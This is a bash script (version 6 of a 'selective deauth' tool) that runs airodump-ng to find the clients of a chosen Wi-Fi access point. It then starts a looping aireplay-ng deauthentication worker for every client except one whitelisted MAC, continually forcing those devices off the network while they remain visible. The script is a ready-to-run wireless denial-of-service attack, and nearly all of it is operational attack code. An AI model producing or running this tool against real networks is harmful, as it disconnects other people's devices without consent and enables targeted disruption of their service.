#!/bin/bash
# selective_deauth_v6.sh  -- based on v5 (working baseline, logic unchanged)
# Adds: continuous per-client deauth until client disappears.
# Usage: sudo ./selective_deauth_v6.sh <mon_iface> <AP_BSSID> <KEEP_MAC> <CHANNEL> [interval]

set -u

if [[ $EUID -ne 0 ]]; then
    echo "Run as root: sudo $0 ..."
    exit 1
fi

IFACE="$1"
AP="$2"
KEEP="$3"
CH="$4"
INTERVAL="${5:-15}"

if [[ $# -lt 4 ]]; then
    echo "Usage: sudo $0 <mon_iface> <AP_BSSID> <KEEP_MAC> <CHANNEL> [interval]"
    exit 1
fi

# --- Validate interface is in monitor mode (same as v5) ---
if ! iwconfig "$IFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "[!] $IFACE is NOT in Monitor mode."
    echo "    Run first:  sudo airmon-ng check kill && sudo airmon-ng start wlan1"
    echo "    Then use the monitor name it prints (e.g. wlan1mon), NOT wlan1."
    exit 1
fi

KEEP_LOWER=$(echo "$KEEP" | tr 'A-Z' 'a-z')
PREFIX="/tmp/deauth6_$$"
AIRO_PID=""

# deauth worker management
declare -A WORKER_PID   # client_mac -> aireplay-ng PID

cleanup() {
    echo
    echo "[*] Cleaning up..."
    for m in "${!WORKER_PID[@]}"; do
        p=${WORKER_PID[$m]}
        kill -TERM "$p" 2>/dev/null
    done
    sleep 1
    for m in "${!WORKER_PID[@]}"; do
        p=${WORKER_PID[$m]}
        kill -KILL "$p" 2>/dev/null
    done
    if [[ -n "$AIRO_PID" ]] && kill -0 "$AIRO_PID" 2>/dev/null; then
        kill -TERM "$AIRO_PID" 2>/dev/null
        sleep 1
        kill -KILL "$AIRO_PID" 2>/dev/null
    fi
    rm -f ${PREFIX}-* 2>/dev/null
    echo "[*] Done."
    exit 0
}
trap cleanup INT TERM HUP

# --- Lock channel (same as v5) ---
echo "[*] Setting $IFACE to channel $CH"
iwconfig "$IFACE" channel "$CH" 2>&1 | sed 's/^/    /'
sleep 1
echo "[*] Interface channel now: $(iwconfig "$IFACE" 2>/dev/null | grep -oP 'Channel[:=]\s*\K[0-9]+')"
echo

# --- Start airodump-ng in background (same as v5) ---
echo "[*] Starting airodump-ng in background..."
airodump-ng --bssid "$AP" -c "$CH" -w "$PREFIX" --output-format csv "$IFACE" \
    >"${PREFIX}_airodump.log" 2>&1 &
AIRO_PID=$!
echo "[*] airodump PID: $AIRO_PID  (log: ${PREFIX}_airodump.log)"
echo

WAIT=0
while [[ $WAIT -lt 30 ]]; do
    CSV=$(ls -t ${PREFIX}-*.csv 2>/dev/null | head -n1)
    [[ -n "$CSV" && -s "$CSV" ]] && break
    sleep 1
    WAIT=$((WAIT+1))
done
if [[ $WAIT -ge 30 ]]; then
    echo "[!] airodump-ng did not create a CSV in 30s. Check:"
    echo "    cat ${PREFIX}_airodump.log"
    cleanup
fi

echo "[*] CSV: $CSV"
echo "[*] Press Ctrl+C (NOT Ctrl+Z) to stop."
echo

# --- Worker: keep deauthing one client until told to stop ---
# aireplay-ng -0 N sends N deauths and exits; we loop it.
start_worker() {
    local client="$1"
    (
        while true; do
            aireplay-ng --ignore-negative-one --deauth 10 -a "$AP" -c "$client" "$IFACE" \
                >>"${PREFIX}_worker_${client//:/}.log" 2>&1
            sleep 1
        done
    ) &
    WORKER_PID["$client"]=$!
    echo "    [+] Worker started for $client (PID ${WORKER_PID[$client]})"
}

stop_worker() {
    local client="$1"
    local p="${WORKER_PID[$client]:-}"
    if [[ -n "$p" ]]; then
        kill -TERM "$p" 2>/dev/null
        kill -KILL "$p" 2>/dev/null
        unset 'WORKER_PID[$client]'
        echo "    [-] Worker stopped for $client (client gone)"
    fi
}

CYCLE=0
while true; do
    CYCLE=$((CYCLE+1))
    sleep "$INTERVAL"

    CSV=$(ls -t ${PREFIX}-*.csv 2>/dev/null | head -n1)
    if [[ -z "$CSV" || ! -s "$CSV" ]]; then
        echo "[$CYCLE] [!] No CSV yet."
        continue
    fi

    # Extract STATION MACs (same parsing as v5)
    CLIENTS=$(awk -F',' '
        /Station MAC/ { in_sta=1; next }
        in_sta && $1 ~ /^[[:space:]]*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}/ {
            mac=$1
            gsub(/[ \t]/, "", mac)
            print mac
        }
    ' "$CSV")

    # Build the set of *eligible* (non-kept, non-multicast) clients currently visible
    declare -A VISIBLE=()
    for m in $CLIENTS; do
        ml=$(echo "$m" | tr 'A-Z' 'a-z')
        [[ "$ml" == "$KEEP_LOWER" ]] && continue
        fb=$(echo "$m" | cut -d: -f1)
        (( 0x$fb & 1 )) && continue
        VISIBLE["$m"]=1
    done

    if [[ ${#VISIBLE[@]} -gt 0 ]]; then
        echo "[$CYCLE] visible targets: ${!VISIBLE[*]}"
    else
        echo "[$CYCLE] visible targets: <none>"
    fi

    # Start workers for newly seen clients
    for m in "${!VISIBLE[@]}"; do
        if [[ -z "${WORKER_PID[$m]:-}" ]] || ! kill -0 "${WORKER_PID[$m]}" 2>/dev/null; then
            start_worker "$m"
        fi
    done

    # Stop workers for clients no longer visible
    for m in "${!WORKER_PID[@]}"; do
        if [[ -z "${VISIBLE[$m]:-}" ]]; then
            stop_worker "$m"
        fi
    done

    echo "    active workers: ${#WORKER_PID[@]}"
    echo
done
